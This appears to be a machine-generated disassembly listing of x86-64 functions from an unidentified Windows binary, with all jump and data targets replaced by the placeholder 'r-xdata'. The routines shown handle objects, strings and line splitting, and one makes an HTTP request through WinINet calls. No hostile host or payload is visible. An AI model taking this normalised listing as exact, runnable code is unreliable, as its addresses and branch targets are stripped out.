mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x7
call sub_407840
lea rax [ rbx + rbp + 0xb0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_412360
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rax [ rbp + 0x50 ]
mov [ rax + 0x10 ] 0x0
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x18 ]
lea rdx [ r-xdata ]
call sub_407ca0
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_4123e1
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_412470
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
mov [ rbp + 0x60 ] r8
mov [ rbp + 0x68 ] r9d
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x60 ]
mov r8 [ r-xdata ]
call sub_409910
mov rax [ rbp + 0x50 ]
mov ecx [ rbp + 0x68 ]
mov [ rax + 0x10 ] ecx
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x18 ]
lea rdx [ r-xdata ]
call sub_407ca0
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_4124f2
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_412580
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov esi edx
mov rcx rbx
mov edx esi
call sub_405e10
mov rcx [ rbx + 0x8 ]
mov edx [ rbx + 0x10 ]
xor r8 r8
call sub_404d90
lea rcx [ rbx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov [ rbx + 0x10 ] 0x0
test sil sil
jle r-xdata
add rsp 0x28
pop rbx
pop rsi
retn
mov rcx rbx
call sub_405d90
sub_4125e0
push r13
push rdi
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov rsi rdx
mov edi r8d
cmp [ rbx + 0x8 ] 0x0
je r-xdata
lea rcx [ rbx + 0x8 ]
mov rdx rsi
mov r8 [ r-xdata ]
call sub_409910
mov [ rbx + 0x10 ] edi
mov eax r13d
add rsp 0x28
pop rbx
pop rsi
pop rdi
pop r13
retn
cmp [ rbx + 0x10 ] 0x0
je r-xdata
lea rcx [ rbx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov [ rbx + 0x10 ] 0x0
sub_412690
push rbx
sub rsp 0x20
mov rbx rcx
cmp [ rbx + 0x8 ] 0x0
je r-xdata
mov al 0x1
add rsp 0x20
pop rbx
retn
cmp [ rbx + 0x10 ] 0x0
je r-xdata
lea rcx [ rbx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov [ rbx + 0x10 ] 0x0
sub_4126d0
push rbp
sub rsp 0x430
mov rbp rsp
mov [ rbp + 0x448 ] rdx
mov rcx [ rbp + 0x448 ]
call sub_4078e0
nop
nop
lea rcx [ rbp + 0x448 ]
call sub_407780
movzx rax [ rbp + 0x2f ]
lea rsp [ rbp + 0x430 ]
pop rbp
retn
sub_412740
push rbp
push rbx
sub rsp 0x488
mov rbp rsp
mov [ rbp + 0x48 ] rbp
mov [ rbp + 0x4a0 ] rcx
mov [ rbp + 0x4a8 ] rdx
mov [ rbp + 0x4b0 ] r8
mov [ rbp + 0x4b8 ] r9
mov rcx [ rbp + 0x4a8 ]
call sub_4078e0
mov rcx [ rbp + 0x4b0 ]
call sub_4078e0
mov rcx [ rbp + 0x4b8 ]
call sub_4078e0
nop
mov rcx [ rbp + 0x4a0 ]
call sub_412690
mov [ rbp + 0x467 ] 0x0
mov rax [ rbp + 0x4a0 ]
mov rcx [ rax + 0x18 ]
call sub_4084e0
mov rcx rax
xor rdx rdx
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] 0x0
call InternetOpenA
mov [ rbp + 0x468 ] rax
nop
mov rcx [ rbp + 0x4a8 ]
call sub_4084e0
mov rcx [ rbp + 0x468 ]
mov rdx rax
mov r8w 0x50
xor r9 r9
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x38 ] 0x0
call InternetConnectA
mov [ rbp + 0x470 ] rax
nop
mov rcx [ rbp + 0x4b0 ]
call sub_4084e0
mov rcx [ rbp + 0x470 ]
lea rdx [ r-xdata ]
mov r8 rax
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0x80000000
mov [ rsp + 0x38 ] 0x0
call HttpOpenRequestA
mov [ rbp + 0x478 ] rax
nop
mov rcx [ rbp + 0x478 ]
lea rdx [ r-xdata ]
mov r8d 0x2f
mov r9d 0xa0000000
call HttpAddRequestHeadersA
test eax eax
je r-xdata
nop
mov rcx [ rbp + 0x478 ]
call InternetCloseHandle
nop
mov rcx [ rbp + 0x470 ]
call InternetCloseHandle
nop
mov rcx [ rbp + 0x468 ]
call InternetCloseHandle
nop
lea rcx [ rbp + 0x4a8 ]
mov edx 0x3
call sub_407840
movzx rax [ rbp + 0x467 ]
lea rsp [ rbp + 0x488 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x4b8 ]
call sub_4084e0
mov rbx rax
mov rcx [ rbp + 0x4b8 ]
call sub_4084e0
mov rcx rax
call sub_407d80
mov rcx [ rbp + 0x478 ]
lea rdx [ r-xdata ]
mov r8d 0x2f
mov r9 rbx
mov [ rsp + 0x20 ] eax
call HttpSendRequestA
test eax eax
je r-xdata
mov [ rbp + 0x5f ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x5f ] 0x1
mov rax [ rbp + 0x4a0 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov rax [ rbp + 0x4a0 ]
mov r9d [ rax + 0x10 ]
add r9d [ rbp + 0x60 ]
mov r9d r9d
call sub_409850
mov rax [ rbp + 0x4a0 ]
mov rax [ rax + 0x8 ]
mov rcx [ rbp + 0x4a0 ]
mov ecx [ rcx + 0x10 ]
lea rcx [ rax + rcx ]
mov edx [ rbp + 0x60 ]
xor r8 r8
call sub_404d90
lea rcx [ rbp + 0x67 ]
mov rax [ rbp + 0x4a0 ]
mov rax [ rax + 0x8 ]
mov rdx [ rbp + 0x4a0 ]
mov edx [ rdx + 0x10 ]
lea rdx [ rax + rdx ]
mov r8d [ rbp + 0x60 ]
call sub_404ae0
mov rax [ rbp + 0x4a0 ]
mov ecx [ rbp + 0x60 ]
add [ rax + 0x10 ] ecx
jmp r-xdata
mov rcx [ rbp + 0x478 ]
lea rdx [ rbp + 0x67 ]
mov r8d 0x400
lea r9 [ rbp + 0x60 ]
call InternetReadFile
test eax eax
je r-xdata
cmp [ rbp + 0x5f ] 0x0
jne r-xdata
cmp [ rbp + 0x60 ] 0x0
jne r-xdata
mov rcx [ rbp + 0x4a0 ]
call sub_412690
mov [ rbp + 0x467 ] 0x1
jmp r-xdata
sub_412b20
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_412b82
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_412bd0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
mov [ rbp + 0x60 ] r8
mov rcx [ rbp + 0x60 ]
call sub_4078e0
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
nop
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0x60 ]
call sub_412fe0
nop
lea rcx [ rbp + 0x60 ]
call sub_407780
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_412c57
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_412cd0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
mov [ rbp + 0x60 ] r8
mov [ rbp + 0x68 ] r9d
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0x60 ]
mov r8d [ rbp + 0x68 ]
call sub_413140
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_412d4b
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_412da0
push rbp
sub rsp 0x40
mov rbp rsp
mov [ rbp + 0x20 ] rcx
mov [ rbp + 0x2f ] dl
mov [ rbp + 0x38 ] 0x0
mov rcx [ rbp + 0x20 ]
movzx rdx [ rbp + 0x2f ]
call sub_405e10
nop
mov rax [ rbp + 0x20 ]
lea rcx [ rax + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
nop
lea rcx [ rbp + 0x38 ]
call sub_407780
movzx rax [ rbp + 0x2f ]
test al al
jle r-xdata
lea rsp [ rbp + 0x40 ]
pop rbp
retn
mov rcx [ rbp + 0x20 ]
call sub_405d90
sub_412e40
push rbp
push rdi
push rsi
push rbx
sub rsp 0x48
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x38 ] 0x0
nop
xor rbx rbx
jmp r-xdata
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
movsxd rcx ebx
lea rax [ rax - 0x1 ]
cmp rcx rax
jle r-xdata
lea rcx [ rbp + 0x38 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x38 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
mov al 0x1
mov [ rbp + 0x37 ] al
nop
lea rcx [ rbp + 0x38 ]
call sub_407730
movzx rax [ rbp + 0x37 ]
lea rsp [ rbp + 0x48 ]
pop rbx
pop rsi
pop rdi
pop rbp
retn
add ebx 0x1
cmp eax 0x1
jne r-xdata
xor rcx rcx
mov rdx [ rbp + 0x28 ]
mov rdx [ rdx + 0x8 ]
movsxd r8 ebx
cmp [ rdx + r8 * 8 ] 0x0
je r-xdata
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov esi ebx
mov edi eax
sub edi 0x2
cmp esi edi
jg r-xdata
mov rdx [ rbp + 0x28 ]
mov rdx [ rdx + 0x8 ]
movsxd r8 ebx
lea rdx [ rdx + r8 * 8 ]
mov r8d eax
sub ecx eax
add ecx 0x1
mov eax ecx
mov rcx rdx
mov edx r8d
mov r8d eax
call sub_408590
mov rcx [ rbp + 0x28 ]
mov rcx [ rcx + 0x8 ]
movsxd rdx ebx
mov rcx [ rcx + rdx * 8 ]
mov ecx [ rcx - 0x4 ]
nop
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
lea rcx [ rcx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
lea r9 [ rax - 0x1 ]
call sub_409850
sub ebx 0x1
jmp r-xdata
add edi 0x1
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rcx esi
lea rcx [ rax + rcx * 8 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx esi
mov rdx [ rax + rdx * 8 + 0x8 ]
call sub_407ca0
add esi 0x1
cmp esi edi
jne r-xdata
sub_412fe0
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x58 ] rdx
mov rcx [ rbp + 0x58 ]
call sub_4078e0
nop
xor rsi rsi
mov ebx 0x1
cmp ebx esi
je r-xdata
mov rax [ rbp + 0x58 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0x0
je r-xdata
mov rax [ rbp + 0x58 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
lea rcx [ rcx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
lea r9 [ rax + 0x1 ]
call sub_409850
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
mov rcx [ rcx + 0x8 ]
lea rcx [ rcx + rax * 8 - 0x8 ]
mov rdx [ rbp + 0x58 ]
movsxd r8 ebx
mov r9d esi
sub r9d ebx
movsxd r9 r9d
call sub_408510
mov ebx esi
add ebx 0x1
mov rax [ rbp + 0x58 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0xd
jne r-xdata
add esi 0x1
mov rax [ rbp + 0x58 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0xa
je r-xdata
mov rcx [ rbp + 0x28 ]
call sub_412e40
nop
lea rcx [ rbp + 0x58 ]
call sub_407780
movzx rax [ rbp + 0x27 ]
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
add ebx 0x1
add esi 0x1
jmp r-xdata
mov rax [ rbp + 0x58 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0xa
je r-xdata
mov rax [ rbp + 0x58 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0xd
je r-xdata
mov rax [ rbp + 0x58 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0x0
jne r-xdata
nop
sub_413140
push rbp
push rsi
push rbx
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x30 ] rdx
mov [ rbp + 0x3c ] r8d
mov [ rbp + 0x48 ] 0x0
nop
xor rsi rsi
mov ebx 0x1
lea rcx [ rbp + 0x48 ]
mov edx [ rbp + 0x3c ]
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x48 ]
call sub_407e70
mov rcx rax
mov edx [ rbp + 0x3c ]
mov edx edx
xor r8 r8
call sub_404d90
lea rcx [ rbp + 0x48 ]
call sub_407e70
mov rcx [ rbp + 0x30 ]
mov rdx rax
mov r8d [ rbp + 0x3c ]
mov r8d r8d
call sub_404ae0
cmp ebx esi
je r-xdata
mov rax [ rbp + 0x48 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0x0
je r-xdata
mov rax [ rbp + 0x48 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
lea rcx [ rcx + 0x8 ]
mov rdx [ r-xdata ]
mov r8d 0x1
lea r9 [ rax + 0x1 ]
call sub_409850
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
mov rcx [ rcx + 0x8 ]
lea rcx [ rcx + rax * 8 - 0x8 ]
mov rdx [ rbp + 0x48 ]
movsxd r8 ebx
mov r9d esi
sub r9d ebx
movsxd r9 r9d
call sub_408510
mov ebx esi
add ebx 0x1
mov rax [ rbp + 0x48 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0xd
jne r-xdata
add esi 0x1
mov rax [ rbp + 0x48 ]
movsxd rcx esi
cmp [ rax + rcx - 0x1 ] 0xa
je r-xdata
mov rcx [ rbp + 0x28 ]
call sub_412e40
nop
lea rcx [ rbp + 0x48 ]
call sub_407780
movzx rax [ rbp + 0x27 ]
lea rsp [ rbp + 0x50 ]
pop rbx
pop rsi
pop rbp
retn
add ebx 0x1
add esi 0x1
jmp r-xdata
mov rax [ rbp + 0x48 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0xa
je r-xdata
mov rax [ rbp + 0x48 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0xd
je r-xdata
mov rax [ rbp + 0x48 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0x0
jne r-xdata
nop
sub_4132e0
push rbp
push rdi
push rsi
push rbx
sub rsp 0x58
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x30 ] rdx
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x48 ] 0x0
nop
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
xor rbx rbx
mov edi eax
sub edi 0x1
cmp ebx edi
jg r-xdata
nop
nop
lea rcx [ rbp + 0x38 ]
mov edx 0x3
call sub_407810
movzx rax [ rbp + 0x27 ]
lea rsp [ rbp + 0x58 ]
pop rbx
pop rsi
pop rdi
pop rbp
retn
add edi 0x1
add ebx 0x1
cmp ebx edi
jne r-xdata
lea rcx [ rbp + 0x40 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x40 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
lea rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x48 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
lea rcx [ rbp + 0x38 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x38 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rdx [ r-xdata ]
mov r8d 0x1
lea r9 [ rax + 0x1 ]
call sub_409850
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
lea rcx [ rcx + rax * 8 - 0x8 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_407ca0
jmp r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
mov rax [ rcx + rax * 8 - 0x8 ]
cmp [ rax ] 0x20
je r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
lea rcx [ rcx + rax * 8 - 0x8 ]
mov edx 0x1
mov r8d 0x1
call sub_408590
jmp r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rsi rax
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
mov rcx [ rcx + rax * 8 - 0x8 ]
call sub_407d70
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
mov rcx [ rcx + rsi * 8 - 0x8 ]
movsxd rax eax
cmp [ rcx + rax - 0x1 ] 0x20
je r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
mov rax [ rcx + rax * 8 - 0x8 ]
xor rsi rsi
test rax rax
je r-xdata
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx ]
lea rcx [ rcx + rax * 8 - 0x8 ]
mov edx esi
mov r8d 0x1
call sub_408590
mov esi [ rax - 0x4 ]
sub_413590
push rbp
push rsi
push rbx
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x30 ] r8
mov [ rbp + 0x38 ] r9
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x78 ] rdx
mov rcx [ rbp + 0x78 ]
call sub_409940
nop
mov rax [ rbp + 0x30 ]
mov [ rax ] 0x0
mov rax [ rbp + 0x38 ]
mov [ rax ] 0x0
mov rcx [ rbp + 0x78 ]
call sub_4094d0
xor rbx rbx
mov esi eax
sub esi 0x1
cmp ebx esi
jg r-xdata
nop
nop
lea rcx [ rbp + 0x40 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x78 ]
mov rdx [ r-xdata ]
call sub_409890
movzx rax [ rbp + 0x2f ]
lea rsp [ rbp + 0x50 ]
pop rbx
pop rsi
pop rbp
retn
add esi 0x1
mov rax [ rbp + 0x38 ]
add [ rax ] 0x1
mov rcx [ rbp + 0x98 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov rax [ rbp + 0x38 ]
movsxd r9 [ rax ]
call sub_409850
mov rax [ rbp + 0x98 ]
mov rax [ rax ]
mov rcx [ rbp + 0x38 ]
movsxd rcx [ rcx ]
lea rcx [ rax + rcx * 8 - 0x8 ]
mov rax [ rbp + 0x78 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_407ca0
mov rax [ rbp + 0x30 ]
add [ rax ] 0x1
mov rcx [ rbp + 0x90 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov rax [ rbp + 0x30 ]
movsxd r9 [ rax ]
call sub_409850
mov rax [ rbp + 0x90 ]
mov rax [ rax ]
mov rcx [ rbp + 0x30 ]
movsxd rcx [ rcx ]
lea rcx [ rax + rcx * 8 - 0x8 ]
mov rax [ rbp + 0x78 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_407ca0
jmp r-xdata
lea rcx [ rbp + 0x40 ]
mov rax [ rbp + 0x78 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x40 ]
call sub_4140a0
mov rcx [ rbp + 0x48 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
add ebx 0x1
cmp ebx esi
jne r-xdata
sub_413700
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_413770
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0xe0
mov rbp rsp
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x38 ] rdx
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0xa0 ] 0x0
mov [ rbp + 0xa8 ] 0x0
mov [ rbp + 0xc8 ] 0x0
mov [ rbp + 0xb8 ] 0x0
mov [ rbp + 0xb0 ] 0x0
mov [ rbp + 0xc0 ] 0x0
mov [ rbp + 0xd8 ] 0x0
mov [ rbp + 0xd0 ] 0x0
mov [ rbp + 0x120 ] r8
mov [ rbp + 0x128 ] r9
mov rcx [ rbp + 0x120 ]
call sub_4078e0
mov rcx [ rbp + 0x128 ]
call sub_4078e0
mov rcx [ rbp + 0x130 ]
call sub_4078e0
nop
xor rsi rsi
mov rax [ rbp + 0x40 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
xor rbx rbx
mov edi eax
sub edi 0x1
cmp ebx edi
jg r-xdata
nop
test sil sil
jne r-xdata
add edi 0x1
test sil sil
je r-xdata
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x130 ]
call sub_407ca0
add ebx 0x1
cmp ebx edi
jne r-xdata
mov rax [ rbp + 0x40 ]
mov rcx [ rax + 0x8 ]
call sub_4094d0
add ebx 0x1
mov edi eax
sub edi 0x1
cmp ebx edi
jg r-xdata
cmp [ rbp + 0xd8 ] 0x0
jne r-xdata
lea rcx [ rbp + 0xd8 ]
call sub_407780
lea rcx [ rbp + 0xd0 ]
call sub_407780
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
lea rcx [ rbp + 0xc0 ]
mov rdx [ rbp + 0x120 ]
